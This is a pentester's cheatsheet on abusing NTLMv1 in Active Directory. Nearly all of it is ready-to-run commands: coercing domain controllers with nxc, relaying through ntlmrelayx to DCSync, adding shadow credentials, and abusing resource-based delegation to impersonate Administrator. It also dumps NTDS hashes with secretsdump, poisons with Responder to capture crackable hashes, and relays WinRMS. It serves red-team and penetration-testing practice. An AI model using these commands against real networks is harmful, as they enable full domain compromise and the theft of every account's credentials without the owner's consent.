---
title: NTLMv1
date: 2026-03-09
description: Cheatsheet for NTLMv1 abuse
tags: [ntlmv1, ntlm, AD, relay, cracking]
---

## Check if NTLMv1 is in use - Method 0
```bash
nxc smb $dc -u $admin -p $adminpw -M ntlmv1
```
>[!warning]
>Administrative privileges required :(

&nbsp;

---
## Coerce and relay two DC's to each other - Method 1

```bash
# DCsync with ntlmrelayx
ntlmrelayx.py -t dcsync://$dc-fqdn -smb2support # -auth-smb $user:$pass
nxc smb $dc2 -u $user -p $pass -M coerce_plus -o LISTENER=$attacker ALWAYS=true

# DCsync with secretsdump
ntlmrelayx.py -t smb://$dc-fqdn -socks -smb2support # --remove-mic
nxc smb $dc2 -u $user -p $pass -M coerce_plus -o LISTENER=$attacker ALWAYS=true
prox -f proxychains4relayx.conf secretsdump.py -no-pass $domain/DC1$@ip
```
>[!tip]
>If you receive NTLMv1 hashes from the DC, its possible that you can relay two DC's to each other and use the computer account of one DC to the other. While an computer account is normally not special is an domain controller computer accounts typically highly trusted making an DCSync Attack or RBCD/ Shadow Credentials attack possible, [source](https://medium.com/@offsecdeer/ntlmv1-domain-compromise-9bd8dd7e9891)

&nbsp;

---
## Shadow credentials - Method 2
```bash
# Coerce dc1 and relay to dc2 to create shadow credentials
ntlmrelayx.py -t ldap://$dc-fqdn --remove-mic -smb2support --shadow-credentials
nxc smb $dc2 -u $user -p $pass -M coerce_plus -o LISTENER=$attacker ALWAYS=true

# Retrieving pfx - Method 1
python3 gettgtpkinit.py -cert-pfx [CERTIFICATE].pfx -pfx-pass [PASSWORD] $domain/$dc [TICKET].ccache # If fails, switch DC
export KRB5CCNAME=[TICKET].ccache
python3 getnthash.py $domain/$dc -key [AS-REP encryption key]

# Retrieving pfx - Method 2
certipy cert -pfx [CERTIFICATE].pfx -password [PASSWORD] -export -out dc2.pfx
certipy auth -pfx dc2.pfx -dc-ip $dc-username [MACHINE ACCOUNT$] -domain $domain

# Cleanup, clear shadow creds
certipy shadow clear -account [MACHINE ACCOUNT$] -dc-ip $dc -u administrator@$dc -hashes <NT>
```
>[!example] Sources
>- [TrustedSec](https://trustedsec.com/blog/practical-attacks-against-ntlmv1)
>- [Guide](https://medium.com/@offsecdeer/ntlmv1-domain-compromise-9bd8dd7e9891#:~:text=in%20full%20size-,Shadow%20credentials,-Shadow%20credentials%20is)

&nbsp;

---
## Delegate access - Method 3
```bash
# If the port is closed or filtered, pray MAQ is set not set to 0, if not 0, then create machine account with addcomputer.py or nxc
nmap -p 636 $dc
nxc ldap $dc -u $user -p $pass -M maq
nxc smb $dc -u $user -p $pass -M add-computer -o NAME='AttackerPC' PASSWORD=''

# Relaying to delegate access 
ntlmrelayx.py -t ldap://$dc-fqdn --keep-relaying --remove-mic -smb2support --delegate-access | tee ntlmrelayx.txt

# Relaying to delegate access with specified user 
ntlmrelayx.py -t ldap://$dc-fqdn --keep-relaying --remove-mic -smb2support --delegate-access --no-validate-privs --escalate-user [CONTROLLED-MACINE-ACC]$ 

# Coercing :D
nxc smb $dc2 -u $user -p $pass -M coerce_plus -o LISTENER=$attacker ALWAYS=true

# Request S4U2Self+Proxy tickets to impersonate Administrator
getST.py -spn cifs/$dc2-fqdn -impersonate Administrator $domain/AttackerPC$:[PASSWORD]
export KRB5CCNAME=[TICKET].ccache

# DCsync
secretsdump.py -k $dc2 -user-status -outputfile dcsync_hashes / nxc smb $dc2 --use-kcache --ntds --user=Administrator

# Cleanup, restore the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to its original state
rbcd.py -delegate-to 'dc2$' $domain/administrator -hashes : -dc-ip $dc -action read
rbcd.py -delegate-to 'dc2$' $domain/administrator -hashes : -dc-ip $dc -action flush
```
>[!example] Sources
>- [Guide](https://medium.com/@offsecdeer/ntlmv1-domain-compromise-9bd8dd7e9891#:~:text=on%20domain%20escalation.-,DC%20Relay,-If%20we%20can)
>- [SourceV2](https://trustedsec.com/blog/practical-attacks-against-ntlmv1)

>[!tip]
>If you don't have a machine account, then you can [sacrafice an user](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users) like this [example](https://github.com/mael91620/Barbhack-2025-AD-writeup?tab=readme-ov-file#flag4---first-hard-challenge---ntlmv1-relay-to-ldap-and-spn-less-rbcd).

&nbsp;

---
## Cracking - Method 4

```bash
sudo Responder -I ens33 -ntlmchallenge 1122334455667788 --lm / --disable-ess
```
>[!info]
> The `--lm` flag can make the hashes crackable almost immediately via rainbow tables. If that does not work, try the `--disable-ess` flag instead. When SSP cannot be removed, rainbow table attacks are no longer effective. In that case, the hash can still be cracked with Hashcat after [reformatting](https://crack.sh/cracking-ntlmv1-w-ess-ssp/) it using [ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) or by using [assless-chaps](https://github.com/sensepost/assless-chaps). [Source](https://trustedsec.com/blog/practical-attacks-against-ntlmv1)

&nbsp;

---
## Relaying WINRMS - Method 5 (under specific circumstances)


```bash
# Relaying
ntlmrelayx.py -t winrms://$dc -smb2support -socks --keep-relaying
sudo Responder -I ens33

# Dump secrets if you get an hit
prox -f proxychains4relayx.conf secretsdump.py -no-pass $domain/DC1$@$target-ip
```
>[!info] Requirements
>- NTLMv1 in use or an NTLM downgrade path is available
>- Target has a WinRM-over-HTTPS (WinRMS) listener configured
>- Channel Binding Tokens (CBT) are not enforced (or are set to “None/Relaxed”) on that WinRMS listener
>- ARP/LLMNR/NBT-NS poisoning possible

>[!example] Sources
>- [Tweet](https://x.com/D1iv3/status/1912766570062815622) 
>- [Blogpost](https://sensepost.com/blog/2025/is-tls-more-secure-the-winrms-case./) 
>- [Demo](https://www.youtube.com/watch?v=3mG2Ouu3Umk) 
>- [PR](https://github.com/fortra/impacket/pull/1987) 